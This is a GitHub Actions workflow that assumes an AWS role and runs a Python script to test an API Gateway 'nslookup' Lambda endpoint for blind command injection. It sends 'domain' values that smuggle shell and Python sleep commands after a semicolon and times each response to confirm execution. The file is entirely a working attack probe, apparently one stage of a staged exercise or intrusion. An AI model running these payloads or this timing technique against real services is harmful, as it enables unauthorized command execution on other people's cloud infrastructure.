name: Stage2-Isolate-Command

on:
  push:
    branches:
      - corgi
  workflow_dispatch:

permissions:
  id-token: write
  contents: read

jobs:
  isolate:
    runs-on: ubuntu-latest

    steps:
      - name: Configure AWS
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::009661764077:role/cicdRole
          aws-region: us-east-1

      - name: Isolate Lambda command execution
        shell: bash
        run: |
          set +e

          python3 -m pip install boto3 requests requests-aws4auth --quiet

          python3 - <<'PY'
          import shlex
          import time
          import requests
          import boto3
          from requests_aws4auth import AWS4Auth

          API = "https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup"

          credentials = boto3.Session().get_credentials().get_frozen_credentials()

          auth = AWS4Auth(
              credentials.access_key,
              credentials.secret_key,
              "us-east-1",
              "execute-api",
              session_token=credentials.token
          )

          tests = [
              (
                  "shell_sleep",
                  "example.com; sleep 2; #"
              ),
              (
                  "python_sleep",
                  "example.com; python3 -c "
                  + shlex.quote("import time; time.sleep(2)")
                  + "; #"
              ),
              (
                  "python_path_sleep",
                  "example.com; /var/lang/bin/python3 -c "
                  + shlex.quote("import time; time.sleep(2)")
                  + "; #"
              )
          ]

          for name, command in tests:
              started = time.monotonic()

              try:
                  response = requests.post(
                      API,
                      json={"domain": command},
                      auth=auth,
                      timeout=20
                  )

                  elapsed = time.monotonic() - started

                  print("TEST=" + name)
                  print("HTTP=" + str(response.status_code))
                  print("ELAPSED=%.2f" % elapsed)
                  print("---")

              except Exception as error:
                  elapsed = time.monotonic() - started
                  print("TEST=" + name)
                  print("ERROR=" + repr(error))
                  print("ELAPSED=%.2f" % elapsed)
                  print("---")
          PY
